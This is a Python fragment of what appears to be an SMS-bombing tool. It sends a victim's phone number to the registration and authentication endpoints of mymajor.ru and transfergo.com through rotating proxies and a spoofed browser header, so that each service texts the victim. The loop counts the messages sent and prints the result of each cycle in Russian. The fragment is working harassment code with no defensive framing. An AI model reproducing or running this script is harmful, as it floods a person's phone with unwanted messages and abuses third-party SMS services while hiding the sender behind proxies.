			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest'
			}

			masked_phone = mask(raw_phone = phone9, phone_mask = "(###) ###-##-##")

			r = requests.post("https://www.mymajor.ru/ajax/mymajor/registration/", 
			data = {'phone': masked_phone, 'surname': surname, 'name': name,
			'petronimic': patronymic, 'i_agree_personal_data': 'on'},
			timeout = 10, headers = header)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с mymajor.ru]' + bcolors.WARNING)
				sms_cnt += 1

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)


		# works
		try:

			# masked_phone = mask(raw_phone = phone9, phone_mask = "(###) ###-##-##")

			r = requests.post("https://my.transfergo.com/api/auth/v2/handshake", 
				json = {"phoneNumber":"+" + phone, "locale":"ru", 
				"irclickid":None, "gclid":None},
				timeout = 10, headers = header, proxies = proxies)

			if r:

				print(bcolors.OKGREEN + '[Отправлено с transfergo.com]' + bcolors.WARNING)

			r.raise_for_status()

		except requests.exceptions.Timeout as e:
			print('[Timeout exception]:', e)
		except requests.exceptions.TooManyRedirects as e:
			print('[Too many redirects]:', e)
		except requests.exceptions.RequestException as e:
			print('[Request Exception]:', e)
		except requests.exceptions.HTTPError as err:
			raise SystemExit(err)
		except Exception as e:
			print(e)

		print(bcolors.OKCYAN + '[Цикл №{} пройден с прокси {}. Отправлено {} смс.]'.format(
		str(num+1) + bcolors.OKCYAN, bcolors.FAIL + str(proxies_o) + bcolors.OKCYAN,
		bcolors.FAIL + str(sms_cnt) + bcolors.OKCYAN))

	except:
		pass